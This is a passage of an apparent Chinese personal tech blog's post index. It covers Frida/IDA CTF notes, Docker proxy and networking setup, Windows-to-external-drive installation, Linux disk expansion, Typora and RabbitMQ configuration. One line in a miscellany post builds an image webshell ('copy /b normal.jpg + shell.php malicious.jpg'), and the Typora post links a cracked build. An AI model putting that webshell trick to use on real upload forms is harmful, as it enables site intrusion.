--&gt;|是| H[修正输入]    G --&gt;|否| I[抛出异常]\n\n为何其他方案会失败？\n\n\n问题方案\n本方案的解决方式\n\n\n\n直接修改参数破坏加密流程\n保持原始参数传递路径\n\n\n缺少异常处理导致崩溃\n多层try-catch隔离\n\n\n未考虑IV长度校验\n强制8字节标准化\n\n\n丢失方法上下文\n正确使用this调用\n\n\n性能影响评估\n内存开销每个Hook方法增加约50-100ms延迟（主要来自日志输出）\nCPU占用异常处理分支增加约5%的CPU消耗\n稳定性补偿通过错误处理降低整体崩溃率90%+\n\n\n这种设计完美平衡了监控需求与系统稳定性，其核心在于：\n\n最小侵入原则：保持原始调用链完整\n防御式编程：每个环节都有安全降级方案\n智能修复：自动识别常见错误模式并补偿\n\n尝试进行逆向其实没搞出来,但是学了点东西\n\nida按g搜索位置\n\nshitf + F12 可以找出字符串集\n\n搜索地址0x9A9F但是却跳转到了0x9A90的位置,这是由于因为 IDA 中的 .rodata 段默认以字符串形式显示，而不是每一个字节都有 label。\n也就是说他是按照开始0号位才给的label,如图所示,只有0x9A90,0x9AA0,0x9AB0,0x9AC0才有独立的label\n\nai要求我提供0x09A9F 开始的 22 字节, 那么就需要界定一个字节是多少,一个字节是用两个十六进制来表示\n0x9A9F: 75 6E 77 69 6E 64 3A 20 6D 61 6C 66 6F 72 6D 65        u  n  w  i  n  d  :     m  a  l  f  o  r  m  e0x9AAF: 64 20 44 57 5F 43        d     D  W  _  C\n\n\n可以发现是这个\n75 6E 77 69 6E 64 3A 20 6D 61 6C 66 6F 72 6D 65 64 20 44 57 5F 43 41\n\n","categories":["打靶日记","ISCC2025"],"tags":["re","mobile","frida","sqlcipher","DataGrip"]},{"title":"docker学习","url":"/2025/05/20/%E9%9B%B6%E7%A2%8E%E5%AD%A6%E4%B9%A0/docker/","content":"docker 配置代理使用 systemd 配置 Docker 服务\n使用v2raya来代理: 安装 - v2rayA\n\n# 创建 Docker 代理配置文件sudo mkdir -p /etc/systemd/system/docker.service.dsudo tee /etc/systemd/system/docker.service.d/http-proxy.conf &lt;&lt;EOF[Service]Environment=&quot;HTTP_PROXY=socks5://127.0.0.1:20170&quot;Environment=&quot;HTTPS_PROXY=socks5://127.0.0.1:20170&quot;EOF# 重启 Dockersudo systemctl daemon-reloadsudo systemctl restart docker# 测试拉取镜像（不再需要 proxychains）docker pull praqma/network-multitool\n\n\n第二种方式：使用 daemon.json 配置文件(更省心)ubuntu@ubuntu:~$ sudo cat /etc/docker/daemon.json[sudo] password for ubuntu:&#123;  &quot;proxies&quot;: &#123;    &quot;http-proxy&quot;: &quot;http://192.168.196.1:10808&quot;,    &quot;https-proxy&quot;: &quot;http://192.168.196.1:10808&quot;,    &quot;no-proxy&quot;: &quot;*.example.com,127.0.0.0/8&quot;  &#125;&#125;\n\n\n\n两种代理方式的区别\n\n\n特性\n第一种方式 (systemd)\n第二种方式 (daemon.json)\n\n\n\n配置路径\n/etc/systemd/system/docker.service.d/http-proxy.conf\n/etc/docker/daemon.json\n\n\n代理协议\n支持 HTTP&#x2F;HTTPS&#x2F;SOCKS5 等\n仅支持 HTTP&#x2F;HTTPS\n\n\n作用对象\nDocker 守护进程\nDocker 守护进程 和 容器\n\n\n易用性\n略复杂\n简单，Docker 官方推荐\n\n\n主要区别\n只影响 Docker 守护进程本身，不影响容器内部。\n同时影响 Docker 守护进程和容器内部。\n\n\n什么是守护进程?\n\n**守护进程（Daemon）*是计算机系统中的一种特殊后台服务程序。它通常在操作系统启动时就运行，并在后台持续运行，直到系统关闭。它的主要任务是*提供某种特定的服务，并且它独立于任何用户的直接交互。\n你可以把守护进程想象成一个在幕后默默工作的“管家”或“工人”。\n\n守护进程的特点\n后台运行：它没有图形界面，也不与任何终端或用户会话直接关联。它在后台默默地执行任务。\n独立于用户：它不依赖于任何特定的用户登录。即使你注销了，守护进程仍然会继续运行。\n提供服务：它们通常是为其他程序或用户提供服务的，比如：\nHTTP服务器（如 Nginx 或 Apache）：它是一个守护进程，持续监听80或443端口，等待并响应来自客户端的网页请求。\n数据库服务（如 MySQL 或 PostgreSQL）：它作为守护进程在后台运行，处理来自应用程序的数据库查询和操作。\nSSH 服务：它在后台监听端口，等待用户通过 SSH 协议远程登录。\n\n\n通常以 d 结尾命名：很多守护进程的名称都以 d 结尾，这是 “daemon” 的缩写，比如：\nsshd (SSH daemon)\nhttpd (HTTP daemon)\ndockerd (Docker daemon)\n\n\n\n守护进程与 Docker 的关系在你之前的问题中，我们提到了 dockerd，这就是 Docker 守护进程。\ndockerd 就是一个典型的守护进程。它在后台持续运行，负责管理你的所有 Docker 容器、镜像、网络和数据卷。当你执行 docker run、docker pull 等命令时，你并不是直接在操作系统中操作，而是通过一个客户端向这个在后台运行的 dockerd 守护进程发送指令。\n这就是为什么当 dockerd 没有正确运行或者你没有权限与其通信时，你的 docker 命令就会失败。\n\ndocker镜像构建创建一个镜像首先新建一个node.js项目,这样就会自动生成package.json文件\nnpm init -y\n\n\n由于构建服务器需要express框架,所以就直接进行安装express框架\nnpm install express\n\n\n\n此时package.json中的依赖就会出现express的键值对,并且伴随着node_modules出现,这个文件夹会保存安装的模块\n\n接下来创建app.js文件\nconst express = require(&quot;express&quot;);const app = express();const PORT = 3000;app.get(&quot;/&quot;,(req,res) =&gt;&#123;    res.send(&quot;&lt;p&gt;蛋家好啊&lt;/p&gt;&quot;)&#125;)app.listen(PORT, () =&gt; console.log(&quot;端口3000走起!&quot;));\n\n可以成功运行\n\n接下来就是正式开始制作Dockerfile\nFROM node:18-alpine3.15WORKDIR /egg # 指定工作目录(不是必须)COPY package.json . #这个&quot;.&quot;是工作路径的相对路径RUN npm install # 这个就会按照package.json来进行安装COPY . . # 把本地的所有文件都复制到工作路径 docker中使用缓存package.json不会被复制两次,前面复制了就不会再次复制,而json有缓存,就不用重新去安装依赖,提高速度EXPOSE 3000 # 暴露端口号CMD [&quot;node&quot;, &quot;app.js&quot;] \n\n新建一个.dockerignore可以把不想在COPY . .步骤中复制进去的文件填写到里面\nnode_modulesDockerfile.dockerignore.git.gitignore\n\n\n\n然后构建镜像\ndocker build .\n\n使用命令查看镜像列表\nsudo docker images\n\n\n使用sudo docker tag 镜像ID 名字来添加名字和标签(一次性添加),如果没有后边的”:”的内容就是lastest版本号\n&#96;\n\ndocker login登录到docker hub账号,然后就可以把新建好的镜像推送到docker hub了\ndocker push dansoncut/node.js:v1.0\n\n在构建镜像的时候就自定义名字:\ndocker build -t eggpain-image .\n\n\n删除镜像,如果有些镜像再被使用就需要使用-f强行删除(注意还是需要加上版本号,不然默认是lastest可能找不到)\ndocker rmi -f dansoncut/node.js:v1.0\n\n\n查看拉取的镜像操作可以查看镜像做出了什么操作\nsudo docker image history --no-trunc(不截断) 镜像ID \n\n\n\n使用镜像来启动容器非交互式启动然后使用这个镜像来运行一个容器,如果成功会返回ID号,使用-d来设置后台运行\n但是发现虽然暴露了3000端口但是这是在容器中的，并没有暴露到宿主机中,宿主机中访问3000端口没有任何服务\n\n这是因为Dockerfile文件中的EXPOSE只是让人知道这个镜像在用容器的某个端口,和宿主机无关,所以需要在启动端口的时候手动进行端口映射(主机端口:容器端口) 还可以在后面自定义名字(–name nishixiaozhu)\nsudo docker run -d -p 3000:3000 --name nishixiaozhu eggpain-image\n\n\n\n删除一个容器\nsudo docker rm 部分id/容器名称sudo docker rm -f 部分id/容器名称 # 强行删除\n\n\n\n停止容器,会给容器时间来慢慢关闭\ndocker stop -t=60 容器ID或容器名\n\n\n\n但是发现当在本地修改js文件的时候,镜像及正在运行的容器是不会改变的,这个时候就需要进行一个地址的绑定,让他去指向目标地址(注意这里的-需要绝对路径&#x2F;:&#x2F;工作路径)\nsudo docker run -d -v /home/ubuntu/Desktop/:/nodejstest -p 3000:3000 --name nicaishixiaozhu eggpain-image\n\n\n\n但是出现了新的情况,如果直接修改的话原来的node_modules会被覆盖,所以需要指明不需要同步的文件夹,就是再用-v指定一个文件夹(不同步)\nsudo docker run -d -v /home/ubuntu/Desktop/:/nodejstest -v /egg/node_modules -p 3000:3000 --name eggpain-conner eggpain-image\n\n但是这样如果容器中出现了新的文件夹,宿主机上也会同步(可能会被上传恶意代码)所以需要设置本地为只读模式:ro(readonly)\nsudo docker run -d -v /home/ubuntu/Desktop/:/nodejstest:ro -v /egg/node_modules -p 3000:3000 --name eggpain-conner eggpain-image\n\n\n\n然后会发现设置到这里还是没有用,因为镜像已经构建了,还需要自动重启去更新镜像的内容\n用于自动重启 Node.js 应用当文件发生变化时（比如修改了 .js 文件）\nnpm i nodemon --save-dev\n\n\n然后修改scripts\n\n然后再修改Dockerfile\nCMD [&quot;npm&quot;, &quot;run&quot;, &quot;dev&quot;]\n\n删除原来的image在重新搭建docker build -t eggpain-image\n\n\n搞不定不太想搞了现在（哭 存个档下次再搞）\n使用交互式的方法启动一个拉去的镜像\ndocker images   #查看所有镜像\nroot@ubuntu:/home/ubuntu# docker images   #查看所有容器REPOSITORY               TAG       IMAGE ID       CREATED       SIZEopenjdk                  8         b273004037cc   3 years ago   526MBjustrydeng/jdk8          latest    b9a2453ecafd   6 years ago   482MB\n\n\n\ndocker ps  #查看所有正在运行的容器\ndocker ps -a  #查看所有的容器(包括微运行的)\n\n\n根据已有的镜像建立一个容器表情进入容器内部的交互式shell\ndocker run -it -p 3000:3000 --name jdk8 justrydeng/jdk8 /bin/bash\n\n由于这个镜像只是简单的jdk,没有任何的网络测试环境, 所以还得自己来手动安装,由于目前是用的代理是对全局的代理,所以容器内的网络环境也无需额外考虑\n执行以下命令来安装网络工具\napt-get updateapt-get install -y iputils-ping curl net-tools\n\n进入一个正在运行的容器的bash，可以实现多开\ndocker exec -it 容器名 /bin/bash\n\n\n\n删除一个容器\ndocker ps -a #查看所有容器docker rm id/name #删除一个容器docker rm -f id/name #强制删除一个容器(可能是正在运行的也会被删除)\n\n从本地吧文件移动到容器中\ndocker cp [本地文件或目录路径] [容器名或ID]:[容器内目标路径] \n\ndocker-compose\n创建镜像并启动一个容器\n启动单个容器的命令很长，如果要启动多个容器来执行协调不同的任务(mysql&#x2F;nginx&#x2F;apache)就需要一个统筹启动的应用，docker-compose就可以解决\n需要创建一个docker-compose.yml文件\nversion: &quot;3.8&quot;services:  eggpain-container:    build: .    ports:      - &quot;3000:3000&quot;    volumes:      - ./:/egg:ro      - /egg/node_modules\n\n然后执行\ndocker-compose up -d --build\n\n\n\n可以发现docker-compose创建了新的镜像(nodejstest_eggpain-container_1)和新的容器(nodejstest_eggpain-container)\n\n如果根据已有的本地镜像文件创建一个容器(不用创建镜像)\ndocker-compose up -d  #-d是静默执行\n\n\n\n清除容器\nsudo docker-compose down -v# 使用 -v 选项会删除所有与容器关联的卷，这意味着所有存储在卷中的数据将被永久删除\n\ndocker网络\n【入门篇】Docker网络模式Linux - Bridge | Host | None_哔哩哔哩_bilibili\n\n如何手动关联两个容器**Question1：**两个不同网络的docker如何通信\n问题的起因是两个docker是由不同的方式启动的，一个是使用docker run而另一个使用docker-compose up\n\n**Answer: **docker中提供了解决方案,直接使用命令串联两个docker\n\n需要找出docker-compose启动的网卡长什么样,一般是叫做**_default\ndocker Network ls\n\n\n可以轻松找到应该是nodejstest_default\n\n使用命令docker network connect\n\ndocker network connect nodejstest_default jdk8\n\n\n\nBridge 网络在安装docker之前的linux网卡信息是这样的,只有一张以太网网卡(ens33)和一张lo(loopback回环,只能和自己联通)\n\ndocker安装命令:\nsudo apt-get insatll docker.io -y | less\n\n\n\n会发现此时多了一个docker的网卡信息:\n\n查看这张网卡的具体信息如下:\nsudo docker network inspect bridge | less\n\n\n使用jq来提取一些当前有用的信息:\nsudo docker network inspect bridge | jq &#x27;.[0] | &#123;Name:.Name, Id:.Id, Driver:.Driver, IPAM:.IPAM.Config, Containers:.Containers, Options:.Options&#125;&#x27;\n\n\n\n得到以下内容\nubuntu@ubuntu:~/Desktop$ sudo docker network inspect bridge | jq &#x27;.[0] | &#123;Name:.Name, Id:.Id, Driver:.Driver, IPAM:.IPAM.Config, Containers:.Containers, Options:.Options&#125;&#x27;&#123;  &quot;Name&quot;: &quot;bridge&quot;,  &quot;Id&quot;: &quot;cf904d02cf0101bdf9135a9b7be444ed323fdf5f32a3a98fe7000374d5062347&quot;,  &quot;Driver&quot;: &quot;bridge&quot;,  &quot;IPAM&quot;: [    &#123;      &quot;Subnet&quot;: &quot;172.17.0.0/16&quot;,      &quot;Gateway&quot;: &quot;172.17.0.1&quot;    &#125;  ],  &quot;Containers&quot;: &#123;&#125;,  &quot;Options&quot;: &#123;    &quot;com.docker.network.bridge.default_bridge&quot;: &quot;true&quot;,    &quot;com.docker.network.bridge.enable_icc&quot;: &quot;true&quot;,    &quot;com.docker.network.bridge.enable_ip_masquerade&quot;: &quot;true&quot;,    &quot;com.docker.network.bridge.host_binding_ipv4&quot;: &quot;0.0.0.0&quot;,    &quot;com.docker.network.bridge.name&quot;: &quot;docker0&quot;,    &quot;com.docker.network.driver.mtu&quot;: &quot;1500&quot;  &#125;&#125;\n\n\n\n\n此时可以看到Containers中还没有任何容器,可以添加一个功能性容器然后再来看看实力,如果本地没有这个镜像也会自动拉取\nsudo docker run -d --name egg1 --hostname egg1 praqma/network-multitool\n\n\n\n\n然后可以使用以下命令查看容器是否正在运行\nsudo docker ps\n\n\n然后再次使用命令查看网卡信息就会发现多了一个容器了\n\n此时查看接口信息会发现多了一个奇怪的接口名称,实际上这就是使用bright的网卡情况,而且对于网卡的排序也出了问题,发现顺序为4的网卡消失了\n\n弹幕: veth虚拟以太网接口生成了一对vethx和vethy,vethx在宿主机中与虚拟网卡docker0虚拟桥接网卡相连,vethy在容器网络命名空间内,这样实现容器进程与容器之外的外部网络通信\n\n# 需要注意的是,这个地方查看网卡信息必须使用以下命令,使用ifconfig无法查看从属关系ip address\n\n\n使用以下命令按json格式化网卡信息,并且输出\nip -json address show dev vethd6a5d21 | jq .\n\n\n进入容器查看容器内的网卡信息\nsudo docker exec -it egg1 bash\n\n可以清晰的发现丢失的网卡4就在这里!\n\n使用命令查询这张网卡的具体信息\nip -json -detail address show dev eth0 | jq &#x27;.[0] | &#123;ifindex:.ifindex, link_index:.link_index, ifname:.ifname, linkinfo:.linkinfo , addr_info:.addr_info&#125;&#x27;\n\n\n可以发现对于linkinfo这个参数,就可以判断出当前接口正在和哪个接口进行连接\n同样的命令查询以太网网卡是会显示null的\n\n如果重新添加一个容器,也会发现这个容器有一张在宿主机中隐藏的虚拟网卡,而且这张网卡也是连接到veth上的,然后在宿主机的网卡信息中也会发现一张指向虚拟机的虚拟网卡,也就是这个情况\n\n\nBridge型使用命令来查看现在的网络列表\nsudo docker network ls\n\n\n创建bridge网络\n# -d使用bridge驱动来创建# naihe-bridge 自定义网络名称sudo docker network create -d bridge naihe-bridge\n\n\n通过查询docker network inspect可以发现实际上两个网络的网段是不一样的\nsudo docker network inspect 网络名称 | jq &#x27;.[0] | &#123;Name:.Name, Id:.Id, Driver:.Driver, IPAM:.IPAM.Config, Containers:.Containers&#125;&#x27;\n\n\n使用命令ip address查看网卡信息发现出现了一张新的网卡并且这个网卡名称和网卡id是一样的\n现在来创建一个新容器指定使用这个网卡如下\nsudo docker run -d --name naihe1 --hostname naihe1 --network naihe-bridge praqma/network-multitool\n\n然后查看网卡信息ip address可以发现创建了一个新的网卡使用的master网卡就是之前创建的br-9a14e1ce05d3\n\n可以发现网卡下出现了两个容器\n\n使用命令进去docker中的bash来ping另一个容器的ip发现是可以ping通的\nsudo docker exec -it naihe1 bash\n\n\n而且实际上自定义网卡还自动配置了DNS可以直接ping主机名来实现通信,但是实际上这里指定了hostname所以不明显\n再创建一个容器但是不指定hostname再尝试ping看看能不能ping通\nsudo docker run -d --name naihe3 --network naihe-bridge praqma/network-multitool\n\n虚拟机死机了,重启一个停止的容器命令如下:\n# 查看所有容器信息sudo docker ps -a# 启动一个停止的容器sudo docker start naihe1\n\n可以发现在没有指定容器名的前提下使用自定义网卡是可以实现自动配置dns的\n\n删除创建的网络,但是默认的网络是没有办法删除的\ndocker network rm naihe-bridge\n\n\n\nhost网络型bridge型的网络(无论是自定义还是默认)都需要手动暴露端口才能实现,使用host网络就可以避免这个问题\n\nhost网络无法自定义创建,只能有一个,会报错\nsudo docker network create -d host newhost\n\n\n查看网络环境发现是没有ip的\ndocker network inspect host | jq &#x27;.[0] | &#123;Name:.Name, Id:.Id, Driver:.Driver, IPAM:.IPAM.Config, Containers:.Containers, Options:.Options&#125;&#x27;\n\n\n如果是指定端口关联,host模式下会出问题,因为host模式是不需要端口关联的\nsudo docker run --name egg --network host -p 8080:80 -d praqma/network-multitool\n\n发现出现警告但是仍然可以创建新的容器\n\n实际上这个host网络下的容器就直接是宿主的一个应用了(只有linux下是这样的),在容器中与宿主设备中查看ip address得到的网络信息是一样的\nNone就是不允许进行网络通信区别\n","categories":["常用配置"],"tags":["docker"]},{"title":"安装windwos到移动硬盘","url":"/2025/05/28/%E9%9B%B6%E7%A2%8E%E5%AD%A6%E4%B9%A0/%E5%AE%89%E8%A3%85windows%E5%88%B0%E7%A7%BB%E5%8A%A8%E7%A1%AC%E7%9B%98/","content":"踩过的坑**写在前面: **首先windwos是不允许将系统直接安装到移动硬盘上的,如果强行尝试通过windwos官方的引导程序安装系统到移动硬盘上就会出现两个报错\n\n\n这是两个问题,当然我最开始这两个报错是同时出现在一个提示框里的,但是我没有保存下来,所以就分开找了\n\n第一个报错是报告移动硬盘(磁盘)的分区表MBR不支持安装windows, 需要使用diskgenius格式化成为GPT格式,在此电脑-&gt; 管理-&gt; 存储-&gt; 磁盘管理-&gt; 目标磁盘(手动选择的)-&gt; 属性 -&gt; 卷中可以查看分区表格式,这种情况就需要改变分区表格式\n\n第二个报错是报告这个接口不能用要求换一个接口,实际上是windwos安装的时候只允许安装在与主板相连的接口上,也就是不能在U盘口上,只能使用windwos to go,才能安装自己的系统在移动硬盘上\n\n\n安装过程准备系统装个新的windows引导程序(U盘启动系统)下载路径: 下载 Windows 11\n\n\n接受安全条款之后选择下一步, 选择创建安装介质然后就可以选择对应的u盘来进行安装了,所有的流程执行完毕之后就会得到一个安装系统的u盘\n\n\n然后重启电脑进入pe( f2 &#x2F; fn+f2 ),然后选择允许从U盘上启动,然后改变启动顺序,启动安装程序的系统, 将系统安装与电脑主板直接连接的硬盘插口上(不能是U盘口),我把硬盘盒拆了给装到电脑上了(QAQ)\n然后安装电脑的驱动,从官网上下载,组成了一个全新的能够适应具体电脑的系统,然后就需要进行下面一步才能把新装的系统迁移到移动硬盘上.\n用原来的使用diskgenius迁移系统,直接把目前的系统迁移到移动硬盘上去,这个时候实际上就是制作了一个windows to go来制作一个便携硬盘(但是不会显示提醒你就要做windwos to go)\n\n改变分区表格式使用windwos工具使用diskpart,使用win + r输入diskpart打开工具\n\n然后输入命令来执行分区表格式的转换\nlist diskselect disk 1 # 选择磁盘号clean convert gpt\n\n\n使用diskgenius比较无脑,选中对应的磁盘,直接换就行了\n\n也是可以转回去的\n\n","categories":["零碎学习"],"tags":["windows","diskgenius"]},{"title":"VMware上的Ubuntu磁盘拓展","url":"/2025/05/29/%E9%9B%B6%E7%A2%8E%E5%AD%A6%E4%B9%A0/vmware_ubuntu%E7%A3%81%E7%9B%98%E6%8B%93%E5%B1%95/","content":"出现情况安装conda的时候说我的磁盘空间不足,无法直接安装\n\n解决流程\n三个命令的区别: lsblk与df - h与growpart\n\n\n\nLinux 命令&#x2F;概念\nWindows 对应操作\n作用\n\n\n\ngrowpart\n右键分区 → “扩展卷”\n调整分区边界，让分区占用磁盘新增的未分配空间\n\n\nlsblk\n磁盘管理（查看分区布局）\n显示磁盘&#x2F;分区的物理结构（包括未分配空间）\n\n\ndf -h\n文件资源管理器（此电脑）\n仅显示已挂载（分配盘符）的磁盘空间使用情况\n\n\n但是与Windows不同的是,除了手动拓展分区和拓展磁盘,linux还需要手动拓展文件系统: 使用resize2fs或者xfs_growfs\n\n磁盘拓展查看磁盘分区情况\ndf -h # 用来显示已经挂载磁盘的使用情况\n\n\n可以看到安装要7个g但是根目录只有2个g所以是远远不足,需要拓展磁盘大小. 将虚拟机关机之后再vmwawre的管理中将磁盘大小拓展成40g\n然后运行 \nlsblk # 显示所有块设备（磁盘、分区、LVM、ROM 等）的拓扑结构，包括未挂载的设备。\n\n\n可以发现sda中已经有40个g了,但是对于分区sda1与sda2并没有40g,这就类似windwos磁盘管理中的未分配的磁盘(分盘不彻底),所以需要进行手动”拓展卷”\n通过growpart来进行拓展分区边界(原来是3.7g -&gt; 拓展到40g)\nsudo apt-get updatesudo apt-get install cloud-guest-utilssudo growpart /dev/sda 2\n\n作用：修改GPT分区表中 /dev/sda2 的结束扇区，使其覆盖磁盘所有可用空间。\n\n执行完查看lsblk就可以看到已经拓展了\n\n但是即使拓展了分区边界,对于df -h(文件系统)来说也并没有同步这个内容,这是由于虽然分区拓展了,但是文件系统还是依然没有拓展\n\n文件系统拓展查看文件系统类型\nsudo blkid /dev/sda2\n\n\n\n如果输出包含 TYPE=&quot;ext4&quot; → 使用 resize2fs\n如果输出包含 TYPE=&quot;xfs&quot; → 使用 xfs_growfs\n\n我这里是ext4所以使用 resize2fs\nsudo resize2fs /dev/sda2\n\n\n\n\n\n这个步骤Windows在”扩展卷”时自动完成此步骤，而Linux需要手动触发（更透明但稍繁琐）\nlinux分两步原因:\n\n架构清晰性：Linux严格区分​​存储管理层​​（分区）和​​数据管理层​​（文件系统），权责分明类比：建筑师(growpart)和装修工(resize2fs)各司其职\n灵活性：\n可单独调整分区而不影响文件系统（如先扩展分区，稍后再扩展文件系统）\n支持多种文件系统（ext4用resize2fs，xfs用xfs_growfs）\n\n\n故障隔离：若growpart失败，文件系统保持原状，避免数据损坏\n\n\n再次执行df -h就可以看到磁盘空间成功拓展了,就可以愉快的安装conda啦\n\n","categories":["零碎学习"],"tags":["linux"]},{"title":"typora配置","url":"/2025/06/06/%E9%9B%B6%E7%A2%8E%E5%AD%A6%E4%B9%A0/typora%E9%85%8D%E7%BD%AE/","content":"前言最近换了台电脑,把之前的typora也一块迁移过来,源文件应该是52pojie上来的\n下载注意: 此为学习版,下载学习后请立即删除,支持正版\n正版下载链接: lasted\n学习版百度网盘链接: Typora1.6.7\n初始化配置\n打开后文件情况如下:\n\n关联格式 &amp;&amp; 执行typora.reg插入注册表就能在注册表中找到了\n\n右键添加“新建markdown文件”\n复制以下内容到txt文件中, 然后修改txt后缀为reg\nWindows Registry Editor Version 5.00[HKEY_CLASSES_ROOT.md]@=&quot;Typora.md&quot;&quot;Content Type&quot;=&quot;text/markdown&quot;&quot;PerceivedType&quot;=&quot;text&quot;[HKEY_CLASSES_ROOT.mdShellNew]&quot;NullFile&quot;=&quot;&quot;\n\n\n\n\n\n\n图片设置由于要做hexo，所以图片的格式都得设置成![图片1](filename1.png)然后在同路径下放置同名文件夹来当图片集./typora配置/filename1.png，所以需要直接对typora进行设置\n文件 --&gt; 偏好设置 --&gt; 图像 --&gt; 插入图片时... --&gt; 复制到指定路径\n\n\n","categories":["零碎学习"]},{"title":"2025款拯救者y9000p打开虚拟化Intel Vt-x","url":"/2025/06/06/%E9%9B%B6%E7%A2%8E%E5%AD%A6%E4%B9%A0/%E6%8B%AF%E6%95%91%E8%80%85%E6%89%93%E5%BC%80%E8%99%9A%E6%8B%9F%E5%8C%96/","content":"前言联想******你把虚拟化藏那么深是为了什么！\n附上联想人工客服电话，不得不说联想的售后是真的好，都怀疑是不是要通过这种方式来让顾客了解到联想的超级好的售后政策\n400电话： 4009908888\n本文的照片很多都来自互联网,可以根据对应的图片水印找到出处,需要注意的是,可能部分环境复现使用的照片指向英文版本,但是实际上是对应的具体问题\n问题描述\n软件使用\n使用vmware17.5.2下载真的超级麻烦，故作此备份：备份\n解压后的密码如下(文件名)：\nVMware-workstation-full-17.5.2-23775571.7z\n\n官网hash校验：[ProductFiles - Support Portal - Broadcom support portal](https://support.broadcom.com/group/ecx/productfiles?subFamily=VMware Workstation Pro&amp;displayGroup&#x3D;VMware Workstation Pro 17.0 for Windows&amp;release&#x3D;17.5.2&amp;os&#x3D;&amp;servicePk&#x3D;520398&amp;language&#x3D;EN&amp;freeDownloads&#x3D;true)\n\npowershell求hash命令：\nGet-FileHash .\\VMware-workstation-full-17.5.2-23775571.7z\n\n\n\n直接安装VMware打开虚拟机发现报错\n\n百度查询发现是由于虚拟化没有开启的原因,需要进入bios中开启\n\n上网找发现需要到bios中打开虚拟化\n英特尔平台是“Virtualization Technology”，或者“VT-x”\nAMD平台是“Secure Virtual Machine”，或者“SVM”。\n也就是开启\n\n现在需要做的事情就是让这个选项出现\n\n在bios中找不到对应开启的选项\n\n\n找出虚拟化的过程\n判断本机CPU是否支持虚拟化\nLeoMoon CPU-V - Downloads • LeoMoon Studios，如果上面显示不支持那就不用玩了，但是实际上现在的设备应该没有不支持的\n\n打电话给客服（不是）\n\n按顺序找到高级启动\n设置 --&gt; 系统 --&gt; 恢复 --&gt; 高级启动 --&gt; 立即重新启动\n\n然后就会进入高级启动的页面了\n\n然后单击疑难解答\n\n单击高级设置\n\n然后就会进入高级启动页面\n\n选择UEFI固件设置并进入:\n\n至此大功造成,会直接进入bios,就可以找到虚拟化的选项了\n\n\n","categories":["零碎学习"]},{"title":"碎碎念","url":"/2999/12/30/%E7%A2%8E%E7%A2%8E%E5%BF%B5/","content":"\n密码的原来自己解压缩包的python应用想要使用python -m http.server需要手动配置防火墙策略\n\n构造图片码的方法(&#x2F;b是指使用二进制解析)\ncopy /b normal.jpg + shell.php malicious.jpg\n\npowershell查询hash\nGet-FileHash filepath\n\npowershell检查数字签名 有效值\nGet-AuthenticodeSignature Filepath\n\ngit clone代理\ngit -c http.proxy=socks5://127.0.0.1:20170 clone\n\n"},{"title":"windwos rabbitmq python配置学习","url":"/2025/07/22/%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%85%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/rabbitmq%E9%85%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/","content":"环境配置下载平台windwos平台\nerlang环境rabbitmq是基于erlang环境的,必须要具备erlang语言的环境才可以使用\n以下是提供的erlang下载路径: Downloads - Erlang&#x2F;OTP\n需要注意的是, 可能rabbitmq并不能支持最新版本的erlang,需要根据具体的官网信息来选择erlang版本,在rabbitmq官网会对此做具体声明: Erlang Version Requirements | RabbitMQ\n(by the way: erlang的安装非常受网络影响,建议选择美区节点)\n\n对于erlang来说, 他和一个正常的python包是一样的,都是语言环境,都需要对此做一个具体的环境变量配置(自行配置)\n安装完成,设置好环境变量之后,起一个新的终端页面(设置前打开的bash窗口暂未同步),来验证安装完成情况\nerl或者erl -version()\n\n安装成功!\n\n安装RabbitMQ本体下载RabbitMQ Server,官方下载链接: Installing on Windows | RabbitMQ\n注意需要在已经下载完erlang包并且正确配置到环境变量中才可以开始运行RabbitMQ安装包,否则根本无法运行\n尝试运行来检验是否成功安装\nrabbitmq-plugins enable rabbitmq_management\n\n出现下面内容表示成功安装\n\n该命令的功能说明\n\n启用 Web 管理界面\n安装并激活 rabbitmq_management 插件后，会提供一个基于 Web 的图形化管理控制台（默认端口 15672）。\n通过浏览器访问 http://localhost:15672 即可登录管理界面（默认用户名&#x2F;密码为 guest&#x2F;guest）。\n\n\n提供监控与管理功能\n查看队列、交换机、绑定的实时状态。\n管理用户、权限、虚拟主机（vhost）。\n监控消息流量、连接数、节点健康状况等。\n\n\n暴露 HTTP API\n插件会提供一套 RESTful API（端口 15672），方便通过编程方式管理 RabbitMQ。\n\n\n注册windwos服务\n插件会注册windwos服务并且设置为自动启动，会占用这个15672端口以及部分资源\n\n\n\n实际上是存在命令无法正常启动RabbitMQ Server,就需要在win r中启动”服务”来手动启动RabbitMQ\nservices.msc\n\n访问: http://localhost:15672/\n\n正常启动关闭rabbitmq有多种启动和关闭方式,只要不要混用就不会出问题\n区分好以下命令\nrabbitmq-server.bat # 这个批命令不接受stop参数 使用就是启动rabbitmq-service.batrabbitmqctlrabbitmq-plugins\n\n\n\n正常启动# 启动插件rabbitmq-plugins enable rabbitmq_managementrabbitmq-server.bat# 检查是否启动成功rabbitmq-server.bat status\n\n\n\n正常关闭rabbitmq-plugins disable rabbitmq_managementrabbitmqctl stop\n\n\n问题研究\n不知道在研究啥 几个命令试一试就行了 大不了重启\n\n\n启动命令\nrabbitmq-plugins enable rabbitmq_managementrabbitmq-server start\n\n如果服务无法正常启动,就win+r输入services.msc手动启动这个服务\n尝试访问网页: http://localhost:15672/#/\n密码为: guest guest\n\n使用启动插件命令错误的时候rabbitmq-plugins enable rabbitmq_management,如果出现这种问题使用命令解决,重启插件\nrabbitmq-plugins disable rabbitmq_managementrabbitmq-plugins enable rabbitmq_management\n\n\n\n如何关闭rabbitmq(强制关闭无法正常访问的前提下)\n打开管理员下的cmd,执行命令杀死进程\ntaskkill /F /IM erl.exe\n\n然后查看浏览器端口是否还在占用\nnetstat -ano | findstr &quot;25672&quot;\n\n然后发现还存在占用\n\n强杀PID\ntaskkill /F /PID 37648重新检查端口netstat -ano | findstr &quot;25672&quot;\n\n如果一直被拉起课尝试关闭(可能是注册了服务)\nsc delete RabbitMQ # 删除服务（本教程中不使用服务的方式开关rabbitmqctl stop# 如果无效rabbitmq-service.bat stop\n\n如果在执行rabbitmqctl stop的时候出现了以下问题\n\n这是由于核心问题是：RabbitMQ节点 rabbit@LAPTOP-HB2HIA34 并未运行，导致 rabbitmqctl stop 命令无法执行。可能已通过其他方式（如强制终止进程、服务崩溃等）关闭了RabbitMQ，但未通过正常流程停止，导致残留状态不一致。\n这个时候可以直接通过启动rabbitmqserver来解决\nrabbitmq-plugins enable rabbitmq_managementrabbitmq-server start\n\n然后在执行rabbitmqctl 